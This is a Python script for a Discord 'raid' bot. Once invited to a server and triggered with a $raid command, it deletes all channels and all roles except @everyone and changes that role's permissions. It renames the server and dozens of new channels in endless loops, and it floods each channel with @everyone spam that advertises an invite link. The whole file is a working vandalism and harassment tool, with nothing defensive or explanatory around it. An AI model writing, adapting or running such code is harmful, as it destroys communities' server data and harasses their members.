import discord
from discord.ext import commands
import asyncio
import random
import os

os.system("title RAIDDER BOT")

ascii_banner = """
\033[91m▄▄▄   ▄▄▄· ▪  ·▄▄▄▄  ·▄▄▄▄  ▄▄▄ .▄▄▄      ▄▄▄▄·       ▄▄▄▄▄
\033[91m▀▄ █·▐█ ▀█ ██ ██▪ ██ ██▪ ██ ▀▄.▀·▀▄ █·    ▐█ ▀█▪▪     •██  
\033[91m▐▀▀▄ ▄█▀▀█ ▐█·▐█· ▐█▌▐█· ▐█▌▐▀▀▪▄▐▀▀▄     ▐█▀▀█▄ ▄█▀▄  ▐█.▪
\033[91m▐█•█▌▐█ ▪▐▌▐█▌██. ██ ██. ██ ▐█▄▄▌▐█•█▌    ██▄▪▐█▐█▌.▐▌ ▐█▌·
\033[91m.▀  ▀ ▀  ▀ ▀▀▀▀▀▀▀▀• ▀▀▀▀▀•  ▀▀▀ .▀  ▀    ·▀▀▀▀  ▀█▄▀▪ ▀▀▀   v1.3
\033[0m"""

print(ascii_banner)

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.messages = True

bot = commands.Bot(command_prefix="$", intents=intents)

channel_names = [
    "🔥 ZERO RAIDDER 🔥", "💣 ZERO EXPLOSION 💣", "👾 JOIN ZERO PROJECTS 👾",
    "⚡ ZYRE ON TOP ⚡", "💥 DISCORD DOWN 💥", "🚨 WARNING RAID 🚨"
]
server_names = ["#ZYRE ON TOP", "#ZERO PROJECTS"]

@bot.event
async def on_ready():
    print(f"\nLogged in as: {bot.user} 🟢")
    print("Type /raid in Discord to begin the raid.")
    print("DO NOT CLOSE THIS WINDOW WHILE THE RAID IS RUNNING.\n")

@bot.command()
async def raid(ctx):
    await ctx.message.delete()
    print(f"Raid started in: {ctx.guild.name}")

    async def change_server_name():
        while True:
            try:
                await ctx.guild.edit(name=random.choice(server_names))
            except:
                pass
            await asyncio.sleep(1)

    bot.loop.create_task(change_server_name())

    await cleanup_server(ctx.guild)
    await create_channels_and_spam(ctx.guild)

async def cleanup_server(guild):

    delete_tasks = [channel.delete() for channel in guild.channels if channel is not None]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    role_tasks = [role.delete() for role in guild.roles if role.name != "@everyone"]
    await asyncio.gather(*role_tasks, return_exceptions=True)

    everyone_role = discord.utils.get(guild.roles, name="@everyone")
    if everyone_role:
        perms_tasks = [
            channel.set_permissions(everyone_role, send_messages=False)
            for channel in guild.text_channels
        ]
        await asyncio.gather(*perms_tasks, return_exceptions=True)

        try:
            await guild.default_role.edit(
                permissions=discord.Permissions.all() - discord.Permissions.send_messages
            )
        except:
            pass

async def create_channels_and_spam(guild):
    create_tasks = []

    for _ in range(50):
        name = random.choice(channel_names) + f" {random.randint(1, 999)}"
        create_tasks.append(guild.create_text_channel(name))

    channels = await asyncio.gather(*create_tasks, return_exceptions=True)

    for channel in channels:
        if isinstance(channel, discord.TextChannel):
            bot.loop.create_task(dynamic_channel_behavior(channel))

async def dynamic_channel_behavior(channel):
    async def rename_loop():
        while True:
            try:
                new_name = random.choice(channel_names) + f" {random.randint(100, 999)}"
                await channel.edit(name=new_name)
            except:
                pass
            await asyncio.sleep(4)

    bot.loop.create_task(rename_loop())
    bot.loop.create_task(spam_in_channel(channel)) 

async def spam_in_channel(channel):
    message = """

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone 
## ZERO PROJECTS JOIN NOW ! https://discord.gg/5dgfTYyVQr
[BOOM!](https://tenor.com/view/explosion-mushroom-cloud-atomic-bomb-bomb-boom-gif-4464831)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    for _ in range(100):
        try:
            await channel.send(message)
        except:
            pass
        await asyncio.sleep(0.1)

token = input("\n\033[91mEnter your bot token to start:\033[0m ")
bot.run(token)
